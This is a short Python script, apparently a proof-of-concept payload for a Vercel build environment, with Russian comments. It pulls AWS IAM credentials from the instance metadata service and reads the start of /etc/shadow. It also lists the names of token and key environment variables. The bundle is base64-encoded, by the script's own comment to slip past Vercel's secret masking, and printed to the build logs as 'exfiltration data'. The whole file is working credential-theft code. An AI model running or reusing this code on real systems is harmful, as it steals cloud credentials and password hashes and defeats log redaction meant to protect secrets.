import subprocess
import os
import base64

def get_final_proof():
    # 1. AWS IMDSv2 (IAM Credentials)
    # Пытаемся получить токен и роль через системный curl
    cmd = (
        "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 21600') && "
        "ROLE=$(curl -s -H \"X-aws-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/) && "
        "curl -s -H \"X-aws-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
    )
    iam_data = subprocess.getoutput(cmd)

    # 2. Собираем всё в один пакет
    proof = {
        "IAM_CREDS": iam_data if "AccessKeyId" in iam_data else "ACCESS_DENIED_OR_NO_ROLE",
        "WHOAMI": subprocess.getoutput("id"),
        "HOSTNAME": subprocess.getoutput("hostname"),
        "SHADOW_PREVIEW": subprocess.getoutput("head -n 3 /etc/shadow 2>/dev/null || echo 'Permission Denied'"),
        "ENV_KEYS": [k for k in os.environ.keys() if "TOKEN" in k or "KEY" in k]
    }

    # 3. Печатаем ОГРОМНЫЙ баннер в логах, чтобы не пропустить
    print("\n" + "="*50)
    print("!!! CRITICAL EXFILTRATION DATA START !!!")
    print(base64.b64encode(str(proof).encode()).decode()) # Кодируем, чтобы Vercel не скрыл ключи звездочками
    print("!!! CRITICAL EXFILTRATION DATA END !!!")
    print("="*50 + "\n")

get_final_proof()